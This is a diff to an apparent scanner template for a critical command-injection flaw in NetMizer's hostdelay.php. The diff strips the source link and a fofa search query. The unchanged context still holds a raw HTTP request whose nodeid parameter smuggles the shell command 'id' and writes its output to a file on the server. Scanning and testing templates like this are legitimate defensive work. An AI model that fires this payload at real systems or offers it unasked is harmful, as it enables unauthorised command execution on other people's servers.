@@ -3,12 +3,8 @@ info:
   name: NetMizer 日志审计 hostdelay.php 存在命令注入漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gq633ur3fovwxgat'
+  description: ''
   tags: rce,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: gq633ur3fovwxgat
-    fofa: title=”NetMizer”
 http:
 - raw:
   - 'GET /data/hostdelay/hostdelay.php?action=list&nodeid=;id>131.txt; HTTP/1.1
@@ -20,7 +16,6 @@ http:
     Accept-Encoding: gzip, deflate, br
 
     Connection: keep-alive
-
 
 
     2. 访问得到结果'
